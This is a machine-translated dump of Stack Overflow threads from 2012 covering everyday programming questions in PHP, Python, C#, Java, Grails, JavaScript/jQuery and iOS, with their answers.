错误：不支持的 MCUDA 库实现“”

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T05:40:35.163

您的帖子中出现的错误实际上是您没有为 MCUDA 指定一种库方法来利用 CPU。您必须在出现提示时指定`omp`or ，`pthreads`否则`serial`您将收到该错误。但是要回答您的问题，下一个提示会询问`Library and final source code compiler for MCUDA:`

请记住，MCUDA 是一个源到源转换器。最终它的目的是获取 cuda C 源代码并使其可在 CPU 上编译和运行（仅）。所以这个问题是问“你想使用什么 cpu 编译器？” 但是，我相信该工具真正设置的唯一编译器是 icc（intel c 编译器）。因此，如果您没有 icc，您将难以应对。如果您有 icc（并且它在您的 PATH 上），只需`icc`在提示输入时输入`Library and final source code compiler for MCUDA:`

请注意，MCUDA 需要 root 权限（通常）才能正确安装，并且它有可能修改您的 cuda 安装。

另请注意，MCUDA 有各种限制（例如，无法处理 c++ 代码），如 README 中所述。

# php - 检查一个值是否在数组中

> ID：13537925
> 
> 赞同：0
> 
> 时间：2012-11-24T03:15:27.633
> 
> 标签：php, arrays, isset

我正在尝试检查我是否`$subCat`在数组中有值，然后不要添加它。我应该最终得到一个，`$subCat`但是当我转储时，`$details`我仍然得到完整的数组。为什么是这样？

```
foreach ($detailsFunction as $main) 
{
        $mainlisting = $main['listingId'];
        $mainCat     = strtolower($main['mainCat']);
        $subCatO     = strtolower($main['subCat']);
        $subCat      = str_replace(" ", "-", $subCatO);

        if(isset($subCat) && $subCat == $subCat)
        {

          $details[] = array('url'     => base_url().'listings/'.$mainCat.'/'.$subCat,
                         'mainCat' => $main['mainCat'],
                         'subCat'  => $main['subCat']   
                        );
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:35:57.697

您是否关心保留数字键`$details`？如果不是，您可以添加每个项目`$subCat`作为其键，并在添加之前检查该键是否存在：

```
foreach ($detailsFunction as $main) 
{
        $mainlisting = $main['listingId'];
        $mainCat     = strtolower($main['mainCat']);
        $subCatO     = strtolower($main['subCat']);
        $subCat      = str_replace(" ", "-", $subCatO);

        if(!array_key_exists($subCat, $details))
        {

          $details[$subCat] = array('url'     => base_url().'listings/'.$mainCat.'/'.$subCat,
                         'mainCat' => $main['mainCat'],
                         'subCat'  => $main['subCat']   
                        );
        }
} 
```

# python - Python乘法

> ID：13537926
> 
> 赞同：1
> 
> 时间：2012-11-24T03:15:43.323
> 
> 标签：python, list

> **可能重复：**
> [python中的矩阵乘法？](https://stackoverflow.com/questions/10508021/matrix-multiplication-in-python)

我已经写了一个程序可以将两个矩阵相乘。但是如果两个矩阵有不同的列（错误答案），这些代码就不起作用。

```
C = [[4,1,9], [6,2,8], [7,3,5]]
D = [[2,9], [5,2], [1,0]]
M=[] 
for i in range(len(C)):
     Z.append([])
        for j in range(len(D[0])):
            Z[i].append(0)
            for k in range(len(D[0])):
                M[i][j]+=C[i][k]*D[k][j]
print (M) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:33:49.523

在你的最后一个循环中，你想要`k`从 up to `len(D)`or `len(C[0])`（它必须相等，否则乘法没有任何意义）。这是修复它的代码的最小修改：

```
C = [[4,1,9], [6,2,8], [7,3,5]]
D = [[2,9], [5,2], [1,0]]

assert(len(C[0]) == len(D))      # sanity check!
M=[] 
for i in range(len(C)):
    M.append([])
    for j in range(len(D[0])):
        M[i].append(0)
        for k in range(len(D)):  # fixed value
            M[i][j]+=C[i][k]*D[k][j]
print (M) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:19:27.093

[这是使用 numpy 的其他版本](http://www.cv.nrao.edu/~aleroy/pytut/topic1/intro_numpy_math.py)

好吧，我只是放了一点代码，但这里是整个代码：

```
# matrices.py
# This optional case study solves each of the following problems.  Each
# solution uses the solutions to the preceding problems.

# 1) Multiply two matrices
# 2) Invert a matrix
# 3) Solve a system of linear equations
# 4) Fit an exact polynomial to a list of points
# 5) Find the coefficients of the polynomial for a power sum

# This last problem needs a little explaining.  Consider this power sum:
# 1 + 2 + ... + n.  We know this equals n(n+1)/2\.  We can represent this
# quadratic function by its coefficients alone, as [1/2, 1/2, 0] (ignoring
# integer division in this explanation).

# Now, the sum of the squares is: 1**2 + 2**2 + ... + n**2\.  This is a cubic
# equation.  It happens to be [1/3, 1/2, 1/6, 0].  That is:
# 1**2 + ... + n**2 = (1/3)n**3 + (1/2)n**2 + (1/6)n

# In fact, for positive integer k, 1**k + ... + n**k is a (k+1)-degree
# polynomial.  The problem we are solving is to write a function which takes
# this number k, and returns the coefficients of that polynomial.

# Also, our approach for matrix multiplication needs some slight explaining.
# We basically use Gauss-Jordan Elimination to get reduced row echelon form
# while applying the same elementary row operations to an identity matrix -- in
# so doing, the identity matrix is transformed into the inverse of the original
# matrix.  Amazing!

import copy
from fractions import Fraction

def copyMatrix(m):
    return copy.deepcopy(m)

def makeIdentity(n):
    result = make2dList(n,n)
    for i in xrange(n):
        result[i][i] = Fraction(1, 1)
    return result

def testMakeIdentity():
    print "Testing makeIdentity...",
    i3 = [[1,0,0],[0,1,0],[0,0,1]]
    assert(i3 == makeIdentity(3))
    print "Passed!"

def multiplyMatrices(a, b):
    # confirm dimensions
    aRows = len(a)
    aCols = len(a[0])
    bRows = len(b)
    bCols = len(b[0])
    assert(aCols == bRows) # belongs in a contract 
    rows = aRows
    cols = bCols
    # create the result matrix c = a*b
    c = make2dList(rows, cols)
    # now find each value in turn in the result matrix
    for row in xrange(rows):
        for col in xrange(cols):
            dotProduct = Fraction(0, 1)
            for i in xrange(aCols):
                dotProduct += a[row][i]*b[i][col]
            c[row][col] = dotProduct
    return c

def testMultiplyMatrices():
    print "Testing multiplyMatrices...",
    a = [ [ 1, 2, 3],
          [ 4, 5, 6 ] ]
    b = [ [ 0, 3],
          [ 1, 4],
          [ 2, 5] ]
    c = [ [ 8, 26],
          [17, 62 ] ]
    observedC = multiplyMatrices(a, b)
    assert(observedC == c)
    print "Passed!"

def multiplyRowOfSquareMatrix(m, row, k):
    n = len(m)
    rowOperator = makeIdentity(n)
    rowOperator[row][row] = k
    return multiplyMatrices(rowOperator, m)

def testMultiplyRowOfSquareMatrix():
    print "Testing multiplyRowOfSquareMatrix...",
    a = [ [ 1, 2 ],
          [ 4, 5  ] ]
    assert(multiplyRowOfSquareMatrix(a, 0, 5) == [[5, 10], [4, 5]])
    assert(multiplyRowOfSquareMatrix(a, 1, 6) == [[1, 2], [24, 30]])
    print "Passed!"

def addMultipleOfRowOfSquareMatrix(m, sourceRow, k, targetRow):
    # add k * sourceRow to targetRow of matrix m
    n = len(m)
    rowOperator = makeIdentity(n)
    rowOperator[targetRow][sourceRow] = k
    return multiplyMatrices(rowOperator, m)

def testAddMultipleOfRowOfSquareMatrix():
    print "Testing addMultipleOfRowOfSquareMatrix...",
    a = [ [ 1, 2 ],
          [ 4, 5  ] ]
    assert(addMultipleOfRowOfSquareMatrix(a, 0, 5, 1) == [[1, 2], [9, 15]])
    assert(addMultipleOfRowOfSquareMatrix(a, 1, 6, 0) == [[25, 32], [4, 5]])
    print "Passed!"

def invertMatrix(m):
    n = len(m)
    assert(len(m) == len(m[0]))
    inverse = makeIdentity(n) # this will BECOME the inverse eventually
    for col in xrange(n):
        # 1\. make the diagonal contain a 1
        diagonalRow = col
        assert(m[diagonalRow][col] != 0) # @TODO: actually, we could swap rows
                                         # here, or if no other row has a 0 in
                                         # this column, then we have a singular
                                         # (non-invertible) matrix.  Let's not
                                         # worry about that for now.  :-)
        k = Fraction(1,m[diagonalRow][col])
        m = multiplyRowOfSquareMatrix(m, diagonalRow, k)
        inverse = multiplyRowOfSquareMatrix(inverse, diagonalRow, k)
        # 2\. use the 1 on the diagonal to make everything else
        #    in this column a 0
        sourceRow = diagonalRow
        for targetRow in xrange(n):
            if (sourceRow != targetRow):
                k = -m[targetRow][col]
                m = addMultipleOfRowOfSquareMatrix(m, sourceRow, k, targetRow)
                inverse = addMultipleOfRowOfSquareMatrix(inverse, sourceRow,
                                                         k, targetRow)
    # that's it!
    return inverse

def testInvertMatrix():
    print "Testing invertMatrix...",
    a = [ [ 1, 2 ], [ 4, 5  ] ]
    aInverse = invertMatrix(a)
    identity = makeIdentity(len(a))
    assert (almostEqualMatrices(identity, multiplyMatrices(a, aInverse)))
    a = [ [ 1, 2, 3], [ 2, 5, 7 ], [3, 4, 8 ] ]
    aInverse = invertMatrix(a)
    identity = makeIdentity(len(a))
    assert (almostEqualMatrices(identity, multiplyMatrices(a, aInverse)))
    print "Passed!"

def solveSystemOfEquations(A, b):
    return multiplyMatrices(invertMatrix(A), b)

def testSolveSystemOfEquations():
    print "Testing solveSystemOfEquations...",
    # 3x + 2y - 2z = 10
    # 2x - 4y + 8z =  0
    # 4x + 4y - 7z = 13
    # x = 2, y = 3, z = 1
    A = [ [3,  2, -2],
          [2, -4,  8],
          [4,  4, -7] ]
    b = [ [ 10 ],
          [  0 ],
          [ 13 ] ]
    observedX = solveSystemOfEquations(A,b)
    expectedX = [ [ 2 ],
                  [ 3 ],
                  [ 1 ] ]
    assert(almostEqualMatrices(observedX, expectedX))
    print "Passed!"

def fitExactPolynomial(pointList):
    n = len(pointList)
    degree = n - 1
    # 1\. make A
    A = make2dList(n,n)
    for row in xrange(n):
        for col in xrange(n):
            x = pointList[row][0]
            exponent = degree - col
            A[row][col] = x**exponent
    # 2\. make b
    b = make2dList(n,1)
    for row in xrange(n):
        y = pointList[row][1]
        b[row][0] = y
    # use system solver to find solution
    return solveSystemOfEquations(A, b)

def testFitExactPolynomial():
    print "Testing fitPolynomialExactly...",
    def f(x): return 3*x**3 + 2*x**2 + 4*x + 1
    expected = [[3], [2], [4], [1]]
    pointList = [(1,f(1)), (2,f(2)), (5,f(5)), (-3,f(-3))]
    observed = fitExactPolynomial(pointList)
    assert(almostEqualMatrices(observed, expected))    
    print "Passed!"

def findCoefficientsOfPowerSum(k):
    # Assume f(n) = 1**k + ... + n**k
    # We argued by handwaving-ish-calculusy-stuff that f(n) is
    # a polynomial of degree (k+1)
    # We need (k+2) points to fit just such a polynomial
    pointList = []
    y = 0    
    for n in xrange(1,k+3):
        x = Fraction(n, 1)
        # y = 1**k + ... + n**k
        y += x**k
        pointList += [(x,y)]
    return fitExactPolynomial(pointList)

def testFindCoefficientsOfPowerSum():
    print "Testing findCoefficientsOfPowerSum..."
    # Not a formal test here, just printing the answers.
    # Check here for expected values:
    # http://mathworld.wolfram.com/PowerSum.html
    for k in xrange(10):
        print "k = %d:" % k,
        printMatrix(findCoefficientsOfPowerSum(k))
    print "Passed!"

def almostEqualMatrices(m1, m2):
    # verifies each element in the two matrices are almostEqual to each other
    # (and that the two matrices have the same dimensions).
    if (len(m1) != len(m2)): return False
    if (len(m1[0]) != len(m2[0])): return False
    for row in xrange(len(m1)):
        for col in xrange(len(m1[0])):
            if not almostEqual(m1[row][col], m2[row][col]):
                return False
    return True

def almostEqual(d1, d2):
    epsilon = 0.00001
    return abs(d1 - d2) < epsilon

def make2dList(rows, cols):
    a=[]
    for row in xrange(rows): a += [[0]*cols]
    return a

def printMatrix(a):
    def valueStr(value):
        if (isinstance(value, Fraction)):
            (num, den) = (value.numerator, value.denominator)
            if ((num == 0) or (den == 1)): return str(num)
            else: return str(num) + "/" + str(den)
        else:
            return str(value)
    def maxItemLength(a):
        maxLen = 0
        rows = len(a)
        cols = len(a[0])
        for row in xrange(rows):
            for col in xrange(cols):
                maxLen = max(maxLen, len(valueStr(a[row][col])))
        return maxLen
    if (a == []):
        # So we don't crash accessing a[0]
        print []
        return
    rows = len(a)
    cols = len(a[0])
    fieldWidth = maxItemLength(a)
    print "[",
    for row in xrange(rows):
        if (row > 0) and (len(a[row-1]) > 1): print "\n  ",
        print "[",
        for col in xrange(cols):
            if (col > 0): print ",",
            # The next 2 lines print a[row][col] with the given fieldWidth
            format = "%" + str(fieldWidth) + "s"
            print format % valueStr(a[row][col]),
        print "]",
    print "]"

def main():
    testMakeIdentity()
    testMultiplyMatrices()
    testMultiplyRowOfSquareMatrix()
    testAddMultipleOfRowOfSquareMatrix()
    testInvertMatrix()
    testSolveSystemOfEquations()
    testFitExactPolynomial()
    testFindCoefficientsOfPowerSum()

main() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T03:41:25.357

OMG，把`D`in`for k in range(len(D[0])):`改成`C`. 该程序将起作用。感谢你们！

# c# - 如何在接口中对构造函数参数进行约束？

> ID：13537929
> 
> 赞同：0
> 
> 时间：2012-11-24T03:17:08.743
> 
> 标签：c#, .net, design-patterns, constraints

如何对构造函数参数施加约束？
这是一个好习惯吗？

我有一个接口，我需要 Logger 组件（由统一注入）。
如何强制所有派生类都将 Logger 组件 (ILogger) 作为参数？

我找不到任何合适的解决方案。

我发现的唯一解决方法是将方法`Initialize (<parameters>)`放在界面中。这是一种丑陋的方法，需要特殊处理。

有没有解决这些问题的设计模式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T04:38:45.537

您不需要约束来强制派生类具有记录器组件。只需定义基类构造函数来获取 ILogger。

```
public class Foo
{
    public Foo (ILogger logger) { /* some implementation here */ }
}

public class Bar : Foo
{
    public Bar(ILogger logger)
        : base(logger)
    {
        // some implementation here
    }
} 
```

由于 Bar 派生自 Foo，因此它被迫使用带有记录器的构造函数。您还可以使 Foo 抽象，这将强制用户创建派生类的实例而不是 Foo 本身。

当您需要定义接口时，不要只考虑 C# 接口。抽象类非常适合这种情况。通常将抽象类视为接口（不是 C# 接口）。您所要求的不能用 C# 接口完成，因为它们定义了合同，而不是实现。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T22:21:26.150

你为什么要强迫这样的事情？

关注什么是真正的合约（由接口定义），而不是像日志记录这样不重要的事情。合同应该以某种方式定义，即您不能在不失去执行核心功能的能力的情况下删除任何方法/属性。

例如，如果您有一个接口：

```
interface IAdder
{
    double Add(double first, double second);
} 
```

添加是核心功能。你可以有第三个参数 ILogger，但没有它你仍然可以添加。日志记录是实现细节，它不应该是合同的一部分。

# google-apps-script - 在 Google 页面中嵌入 Google 驱动器

> ID：13537937
> 
> 赞同：1
> 
> 时间：2012-11-24T03:18:25.943
> 
> 标签：google-apps-script, google-drive-api

我正在尝试在我的 Google 页面中显示特定的私人共享驱动器文件夹。我正在使用本指南：[https ://developers.google.com/apps-script/articles/embedding_docslist_in_sites](https://developers.google.com/apps-script/articles/embedding_docslist_in_sites)

我被困在步骤“8。用文件柜的网址替换`PASTE_PAGE_URL_HERE`方法中。”`getPageByUrl()`

`getPageByUrl()`我已经尝试了“”中的每个 URL 组合，但我只是在该方法上遇到脚本错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:49:00.253

我刚刚对此进行了测试，它似乎对我来说效果很好。确保您使用文件柜页面的完整 URL。例如，在我的测试站点上，我在模板下拉列表中使用“文件柜”创建了一个新页面，将其命名为“myfcpage”。这给了我一个带有 URL 的新页面：“https://sites.google.com/site/mytestsite/myfcpage”。因此我的函数调用如下所示：

```
var page = SitesApp.getPageByUrl("https://sites.google.com/site/mytestsite/myfcpage"); 
```

# java - 为 https 重定向到不同的域

> ID：13537945
> 
> 赞同：1
> 
> 时间：2012-11-24T03:20:00.153
> 
> 标签：java, spring, spring-security, security

我正在使用弹簧安全性，我想对一些 url 强制使用 HTTPS。但是我的证书在子域上。

例如，如果他们点击 http:// **www** .mydomain.com/myaccount 我希望他们被重定向到 https:// **secure** .mydomain.com/myaccount

使用 Spring Security 实现此目的的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:58:46.590

不确定是否是最有效的方法，但

```
if(URL.getProtocol().equalsIgnoreCase("https"))
 then replace "www." with " secure." 
```

请参阅第二部分[如何在 url 中替换 www](https://stackoverflow.com/questions/4136707/how-to-replace-www-from-url-without-breaking-urls-like-www-someurlwww-com)

# mysql - Grails 没有在 propper 数据库中保存域类

> ID：13537947
> 
> 赞同：0
> 
> 时间：2012-11-24T03:20:09.263
> 
> 标签：mysql, grails, grails-2.0

我有一个 grails (2.0) 应用程序，它需要从多个 MySQL 数据库中获取某些信息。看在上帝的份上，我无法将域类保存在正确的数据库中。

我的 Datasource.groovy 文件是这样的：

```
environments {
development {
    dataSource {
        dbCreate = "create-drop"
        url = "jdbc:mysql://localhost:3306/informacion_empleados_dev"
    }
    dataSource_signOn {
        driverClassName = "com.mysql.jdbc.Driver"
        username = "root"
        password = ""
        dbCreate = "create-drop"
        url = "jdbc:mysql://localhost:3306/sign_on"
    }
    dataSource_administradores {
        driverClassName = "com.mysql.jdbc.Driver"
        username = "root"
        password = ""
        dbCreate = "create-drop"
        url = "jdbc:mysql://localhost:3306/administradores"
    }
    dataSource_docentes {
        driverClassName = "com.mysql.jdbc.Driver"
        username = "root"
        password = ""
        dbCreate = "create-drop"
        url = "jdbc:mysql://localhost:3306/docentes"
    }
    dataSource_alumnos {
        driverClassName = "com.mysql.jdbc.Driver"
        username = "root"
        password = ""
        dbCreate = "create-drop"
        url = "jdbc:mysql://localhost:3306/alumnos"
    }
} 
```

我的每个域类都这样引用它们

```
class Alumno {

static constraints = {      
    matricula   blank: false
    nombres     blank: false
    apellidos   blank: false
}

static mappings = {
    datasource  'alumnos'
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T06:12:29.877

In your domain class, it should be `mapping` not `mappings`

```
static mapping = {
    datasource  'alumnos'
} 
```

# actionscript-3 - Is there a way to play a sound by specifying the frequency in Hz instead of musical note in SION?

> ID：13537948
> 
> 赞同：0
> 
> 时间：2012-11-24T03:20:13.883
> 
> 标签：actionscript-3, audio, synthesizer

I have been searching for ways to produce sound in as3 and found SION: [https://sites.google.com/site/sioncenter/](https://sites.google.com/site/sioncenter/)

Seems great, but I have one issue: I need to play tones at specific frequencies. The only options I find to play sounds is by specifying the frequency as musical notes (a, b, c, etc), but I need to play sounds specifying the frequency in Hz (30Hz, 100Hz, etc).

Is there a way to do this in SION?

If not, is there an alternative to SION? I need a sine wave generator.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T00:01:21.740

You don't need SION for that. You can do it with the Sound class.

Here's a tutorial that shows exactly how to do it: [http://www.bit-101.com/blog/?p=2669](http://www.bit-101.com/blog/?p=2669)

# javascript - 模糊事件和 javascript/html

> ID：13537952
> 
> 赞同：0
> 
> 时间：2012-11-24T03:20:34.490
> 
> 标签：javascript, listener, dom-events, blur

我必须询问用户的姓名和身份证号码。使用诸如模糊或提交事件之类的事件处理程序，并检查用户文本框是否为空并且 id 是一个数字，如果为假，我必须设置一个警报框。

这是我的html:。

```
<form id = "form" action = "">
     <p>
         <label class = "classname" for = "name">Username:</label>
         <input type = "text" id = "name" placeholder = "enter your Username">
     </p>
     <p>
         <label class = "classname" for = "idnum">ID Number:</label>
         <input type = "text" id ="idnumber" placeholder = "enter id number">
     </p>
</form> 
```

这是我的 Javascript 代码：

```
var helpArray = ["your doing it wrong", "your wrong"]
var helpText;

function init(){
     helpText = document.getElementById("helpText");
     registerListeners(document.getElementById("name"),0);
     registerListeners(document.getElementById("idnumber"),0);
}

function registerListeners(object, messageNumber){
     object.addEventListener( "blur",function(){
          helpText.innerHTML = helpArray [0];
     }, false);

     object.addEventListener( "focus",function(){
          helpText.innerHTML = helpArray [messageNumber];
     }, false);
}
window.addEventListener("load",init,false); 
```

如您所见，我一直在尝试按照我的教科书进行，没有取得太大进展。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T06:40:57.533

您可以使用如下所示的简单代码，而不是多次调用函数。在 javascript 中多次调用函数可能会导致性能成本

```
window.onload = init;

    function init(){
        helpText = document.getElementById("helpText");
        document.getElementById("name").onblur =  function() {
          helpText.innerHTML = helpArray [0];}, false);
       }
       document.getElementById("idnumber").onblur =  function() {
          helpText.innerHTML = helpArray [0];}, false);
       }
     } 
```

你可以像上面的例子那样为任何事件分配函数，你也可以使用 onfocus,onkeyUp..etc..

# java - 每年在 Java Web 应用程序中执行一项任务

> ID：13537953
> 
> 赞同：3
> 
> 时间：2012-11-24T03:20:44.973
> 
> 标签：java, time, timer

如何在 Web 应用程序中每年自动执行一项任务？Timer 类对此有帮助吗？我也听说过石英？我在他们的页面上注册了，但似乎不是免费的。感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T03:25:35.197

Quartz 绝对是一个不错的选择，它是[免费](http://quartz-scheduler.org/downloads/catalog)和开源的，并且使用[Apache 2.0 许可证](http://www.apache.org/licenses/LICENSE-2.0)（您无需注册即可下载）。如果您在 *nix 环境中，您也可以简单地使用 cron。

您也可以使用 a`java.util.Timer`但我只会在您的用例非常琐碎的情况下这样做，并且您确保`Timer`在 Web 应用程序启动时基于某种类型的持久层正确地重新启动。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T03:43:52.913

考虑与业务利益相关者核实一年只运行一次的工作是否真的应该完全自动化。根据我的经验，很可能会对日程安排（例如，今年应该在一周中的哪一天运行？）或在这么长时间后对工作的步骤进行细微的更改。

另外，未来还会有其他预定的作业添加到系统中吗？如果不是 - 如果每年只有一项工作，是否值得将自动执行的开销（实施、测试、监控等）添加到系统中？不经常运行的东西很容易被遗忘，当它坏掉时没人会注意到。

考虑这个替代方案：在您的应用程序中的某处添加一个按钮以手动启动工作，可能在管理页面上。如果您的应用程序有仪表板或登录页面，请添加一些仅对某些用户可见的信息，例如管理员 - 例如：“X 作业应该在 2011 年 11 月 23 日最后一次运行 - 请启动下一次运行2012 年 11 月 30 日之前”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T03:50:28.223

我建议你使用类似 cron 的东西。您的要求与 UNIX cron 守护程序的活动非常相似。有一个提供相同功能的 java 库，称为 cron4j (http://www.sauronsoftware.it/projects/cron4j/)。

以下是您可以使用的一些调度程序。

*   [cron4j](http://java-source.net/open-source/job-schedulers/cron4j)
*   [石英](http://java-source.net/open-source/job-schedulers/quartz)
*   [jcrontab](http://java-source.net/open-source/job-schedulers/jcrontab)
*   [Essiembre J2EE 调度程序](http://java-source.net/open-source/job-schedulers/essiembre-j2ee-scheduler)
*   [JDRing](http://java-source.net/open-source/job-schedulers/jdring)

# ios - 在 ScrollView 和 ImageView 中捏合时图像会抖动

> ID：13537954
> 
> 赞同：1
> 
> 时间：2012-11-24T03:21:14.207
> 
> 标签：ios, imageview, scrollview, zooming, pinch

我遵循了 Standford CS193P 课程并编写了一个程序，该程序可以在嵌入 ScrollView 的 ImageView 中缩放图片。当我捏的时候，它起作用了，图片会不断地“摇晃”。我录制了一个视频：[dropbox video link](http://dl.dropbox.com/u/3357135/ScrollViewProblem.mov)

我的代码很简单：

```
-(UIView *) viewForZoomingInScrollView:(UIScrollView *)scrollView{
    return self.imageView;
}
- (void)viewDidLoad{
    [super viewDidLoad];
    self.scrollView.delegate=self;
    self.scrollView.contentSize=self.imageView.frame.size;
    self.imageView.frame=CGRectMake(0, 0, self.imageView.frame.size.width, self.imageView.frame.size.height);
} 
```

我将情节提要放大到 5 和 0.2 `max`。`min`

为什么会发生这种震动？

# javascript - 通过（单独的）类和/或数据值指定 If 语句中两个元素的值

> ID：13537955
> 
> 赞同：0
> 
> 时间：2012-11-24T03:21:37.030
> 
> 标签：javascript, if-statement, this, equals, key-value

*我很抱歉写了这么长的问题，但我被要求澄清有关该功能的几个细节*

如果我想通过类或数据名称（或另一个不需要为每个将使用它的元素创建单独的 If 语句的方法）调用它，那么将另一个元素添加到这些 If 语句的正确方法是什么？

该函数用于成对的 2 个相互关联的元素（谁的类是投诉和排名）。第一个元素的名称与第二个元素的数据名称匹配，并且由于该函数已经识别了“排名”的数据名称，也许可以说第一个元素的名称=第二个元素的数据名称？

```
if ($(this).val() == 1 && !$(this).data("decrease_priority1")) { ... }
if ($(this).data("decrease_priority1") && $(this).val() != 1) { ... } 
```

**这是我正在尝试做的事情：**

第一个 If 语句 - 如果值为：“. complaint” = “Too_small” **AND** .“ranking” = “1”，则设置元素
第二个 If 语句 - 如果值为：“.complaint” = “Too_small” **OR** .“ranking”，则更新元素=“1”

这第二个元素是 .complaint 类下的 select 标记的值，但是有几个元素具有相同的类，所以我需要一种方法来指定它是哪一个。我试图避免使用 ID，因为有 25 个 Select 元素（超过 100 种组合）。

**我试过的方法**

这不能正常工作（它不接受输入，除非在第二对（腰）之前选择了第一对（肩膀））

```
if ($(".complaint select").val() === "Too_small" && $(this).val() == 1 && !$(this).data("increase_priority1")) 
{ ... }

if ($(this).data("increase_priority1") && ($(this).val() != 1 || $(".complaint select").val() != "Too_small")) 
{ ... } 
```

**函数的作用**

此更改功能的目的是获取所有选择的投诉名称（即肩部、腰部）并通过排名将它们分组为动作（即增加或减少），因此对于各种组合调用不同的函数 - 在这种情况下“太小”和“1”。当用户同时选择投诉并对问题的重要性级别进行排名时，此代码段会将值添加到“increase_priority1”，并在用户更改任一元素时删除该值。

如果您想在上下文中看到这一点，我创建了 2 个小提琴。第一个是现有脚本[http://jsfiddle.net/chayacooper/vWLEn/171/](http://jsfiddle.net/chayacooper/vWLEn/171/)，第二个是我正在尝试做的工作示例，但它使用 ID 这样做[http://jsfiddle.net /chayacooper/gYtZw/61/](http://jsfiddle.net/chayacooper/gYtZw/61/)

Javascript

```
var $increase_priority1 = $(".increase_priority1");
// variables for other issues and priority levels go here

$(".ranking").change(function () {
    var name = $(this).data("name"); // Gets data-name of ".ranking" 

    // Sets & Unsets increase_priority1

    // I need to change this to state If values are "Too_small" AND "1" AND (...)  
    if ($(this).val() == 1 && !$(this).data("increase_priority1")) {
        //rank is 1, and not yet added to priority list
        $("<option>", {text: name, val: name}).appendTo($increase_priority1);
        $(this).data("increase_priority1", true); // flag as a priority item
    }
    //If either ranking or complaint value changes 
    if ($(this).data("increase_priority1") && $(this).val() != 1) {
        //is in priority list, but now demoted
        $("option[value=" + name + "]", $increase_priority1).remove();
        $(this).removeData("increase_priority1"); // no longer a priority1 item
    }
    // Similar If Statements go here to set & unset elements for other priority types
}); 
```

如果 $increase_priority1 的值为“Shoulders”，则投诉为“Shoulders too small”（选择名称=Shoulders value=Too_small），并为其分配了 1 级优先级（select class="ranking Shoulders" value=1）。

HTML

```
<label>To Increase - 1rst Priority
<select name="modify_increase_1rst[]" class="increase_priority1" multiple></select></label>    
<span class="complaint"><label>Shoulders</label>
<select name=Shoulders><option value="null">Select</option><option value="Too_small">Too Small</option><option value="Too_big">Too Big</option><option value="Too_expensive">Too expensive</option>   
</select></span>
<label>Ranking</label>
<select name="importance_bother_shoulders" class="ranking shoulders" data-name="Shoulders">
    <option value="Null">Select</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option>
    <option value="5">5</option>
</select> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T05:01:03.317

我发现你的问题有点令人困惑，但是

```
$(".ranking, .complaint select") 
```

提到两个不同的元素，你在函数中对 $(this) 的所有使用似乎有点吓人，而且你从选定的 .complaint 选择中引入了 jQuery 工厂，你是再次调用所有

```
$('.complaint select') 
```

在你的第一个 if 语句中。那个 jQuery 工厂调用会拉入一个包含所有 .complaint 选择元素的数组，因此，对其进行检查 .val() 可能会产生不希望的结果。我确定您打算改为检查 $(this).val() ，或者至少只针对一个 .complaint 选择元素，而不是整个数组。如果要检查整个数组，则应使用 .each() 进行调查。

更符合你想要做的事情？同样，在对代码的混淆（非常随意）和对应用程序目的本身的混淆之间，很难破译您在此处实际尝试做的事情。这也是概念性的，向您展示如何分离这些元素。您需要将它们模块化，它们不应该有任何顾虑：

```
$(".complaint select").change(function() {
     var name = $(this).data("name"); //get priority name    

     // Why was it && before? It's either Too_small or 1 or "Too_small" == 1 so
     // you don't have to check twice for the same thing
     if (($(this).val() === "Too_small" || $(this).val() == 1)  
         &&!$('.ranking').data("increase_priority1")) {
        //rank is 1, and not yet added to priority list
        $("<option>", {text:name, val:name}).appendTo($increase_priority1);
        // .complaint select does not contain a data "increase priority"
        //$(this).data("increase_priority1", true); //flag as a priority item
});

$('.ranking').change(function(){
    if ($(this).data("increase_priority1") &&
    ($(this).val() != 1)) {
        $(".complaint select").each(function(){
        if($(this).val() != "Too_small"){
            //is in priority list, but now demoted
            $("option[value=" + name + "]", $increase_priority1).remove();
            $(this).removeData("increase_priority1"); //no longer a priority item
        }
    }     
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T22:23:49.577

特别感谢 @Lorax 帮助我解决这个问题 :-)

我在下面包含了最终代码，并在[http://jsfiddle.net/chayacooper/6YnQd/42/创建了一个工作示例](http://jsfiddle.net/chayacooper/6YnQd/42/)

Javascript

```
$('.complaint select.complaintOpt').change(function() {
var $container = $(this).parent(),
    $item = $container.find('.complaintItem'),
    itemId = $item.attr('id'),
    itemVal = $item.val(),
    itemText = $item.find('option[value=' + itemVal + ']').html(),
    rank = $container.find('.complaintRanking').val();    
// Ignore if not a complete complaint
if((itemVal == 'Null') || (rank == 'Null')) {
    return;
}    
// Remove any existing complaint
$('select.priorityIssue option.' + itemId).remove();    
var $selectedOption = $item.find('option:selected');
var targetBase = '';
if($selectedOption.hasClass('goal-increase')) {
    targetBase = '#priorityIncrease';
}
else if($selectedOption.hasClass('goal-decrease')) {
    targetBase = '#priorityDecrease';
}    
if(targetBase != '') {
    // Add new complaint
    $(targetBase + rank + 'Issues')
        .append($('<option>' + $item.attr('name') + '</option>').addClass(itemId));
}
}); 
```

HTML

```
<label>To Increase </label><br/>
<label for="priorityIncrease1Issues">First Priority</label>
<select name="modify_increase_1rst[]" id="priorityIncrease1Issues" class="priorityIssue" multiple></select>
<label for="priorityIncrease2Issues">Second Priority</label>
